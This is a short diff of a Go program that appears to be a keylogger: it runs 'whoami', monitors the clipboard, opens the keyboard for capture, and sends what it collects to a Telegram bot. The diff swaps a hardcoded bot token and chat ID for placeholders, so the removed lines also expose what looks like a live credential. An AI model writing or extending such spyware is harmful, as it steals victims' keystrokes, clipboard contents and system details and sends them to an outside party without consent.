@@ -16,8 +16,8 @@ import (
 var logs string
 
 const (
-	botToken = "7849597289:AAHZ3yvh8fGs-EX4qUKGAzCM098RQh5sNE0"
-	ChatID   = "1859109698"
+	botToken = "YOUR_BOT-Token"
+	ChatID   = "YOUT_CHAT-ID"
 )
 
 func main() {
@@ -25,7 +25,6 @@ func main() {
 	version := system("whoami")
 	sendM(version)
 	sendM(StartClipboardMonitor())
-
 	err := keyboard.Open() // ouvrir le clavier
 	if err != nil {
 		log.Fatal(err)
